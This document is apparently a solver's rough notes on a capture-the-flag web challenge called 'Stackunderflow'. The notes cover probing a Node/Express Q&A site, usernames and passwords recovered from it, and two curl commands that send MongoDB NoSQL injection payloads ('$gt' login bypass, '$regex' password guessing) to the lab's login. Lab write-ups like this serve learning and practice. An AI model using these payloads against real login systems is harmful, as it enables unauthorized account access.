# 10 - Stackunderflow

*Check out this new Q&A site. They must be hiding something but we don't know where to search.*

[Stackunderflow](http://whale.hacking-lab.com:3371/)

---

Sql inject. Question params.. ??


Email username !!!
Built on Express

SQL injection?
 https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-online
 GUESS NOT
 
Login (Email username )
 no_one, 
 the_admin
 null
 the_bean
 hax0r
 
Question IDs

http://whale.hacking-lab.com:3371/robots.txt
Maybe the_admin knows more about the flag.

site:http://whale.hacking-lab.com:3371/

curl http://example.com:8080/endpoint?name=Itchy&name=Scratchy

Cookies

https://medium.com/bugbountywriteup/celestial-a-node-js-deserialization-hackthebox-walk-through-c71a4da14eaa

5ce77d7caecd0f0015ce8500
5ce77d7caecd0f0015ce84fa

Passwords

the_admin / 76eKxMEQFcfG3fP
null N0SQL_injections_are_a_thing


https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html


curl -v -X POST -H "Content-Type: application/json" -d '{ "username": {"$gt": ""}, "password": {"$gt": ""} }' http://whale.hacking-lab.com:3371/login

curl  -H "Content-Type: application/json" -d '{ "username": "the_admin", "password": {"$regex": "^[a-zA-Z_]*$"} }' http://whale.hacking-lab.com:3371/login

